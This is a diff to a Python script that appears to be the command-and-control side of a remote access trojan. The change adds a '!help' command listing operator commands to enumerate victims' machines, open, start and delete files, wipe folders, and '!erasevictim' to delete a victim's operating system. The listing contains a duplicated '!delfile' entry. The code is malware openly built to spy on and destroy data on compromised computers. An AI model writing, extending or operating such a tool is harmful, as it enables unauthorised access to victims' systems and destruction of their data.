@@ -49,6 +49,7 @@ def instruct():
     print("")
     print("[+] Commands List:")
     print("")
+    print("[+] !help - Lists all the commands you can use")
     print("[+] !getusername - Gets the Username of the computers")
     print("[+] !getvictimhost - Gets the name of the computers")
     print("[+] !getvictimcwd - Gets the current working directory of the victims computer")
@@ -94,6 +95,21 @@ def instruct():
                         print("[+] There was an error.")
             elif instruction.decode().lower().startswith('!listips'):
                 print(f"[+] List of IPs: {conn_ips}")
+            elif instruction.decode().lower().startswith('!help'):
+                print("\n[+] !help - This command")
+                print("[+] !getusername - Gets the Username of the computers")
+                print("[+] !getvictimhost - Gets the name of the computers")
+                print("[+] !getvictimcwd - Gets the current working directory of the victims computer")
+                print("[+] !changedir - Change the Current working directory of the computer")
+                print("[+] !listdir - Lists all the files in the Victims working directory")
+                print("[+] !erasevictim - Delete the OS of the victims computer")
+                print("[+] !delfile <file> - Deletes a file in the directory")
+                print("[+] !wipefolder <folder> - Wipes all of the files in the current directory(changing it is suggested)")
+                print("[+] !openfile <filename> - Opens a File in Text editor mode(only 1 word filenames)")
+                print("[+] !startfile <filename> - Starts a file(only one word filenames)")
+                print("[+] !delfile <filename> - Deletes a file in the working directory(only 1 word filenames)")
+                print("[+] !getos - Gets the operating system of the victim computer")
+                print("[+] !listips - Lists all connected IPs to the server\n")
             for connection in connections:
                 try:
                     conn = connection
@@ -101,6 +117,7 @@ def instruct():
                 except:
                     print(f"[+] Connection from {conn} had closed.")
                     conn.close()
+                    pass
         except:
             pass
 listener = threading.Thread(target=connect)
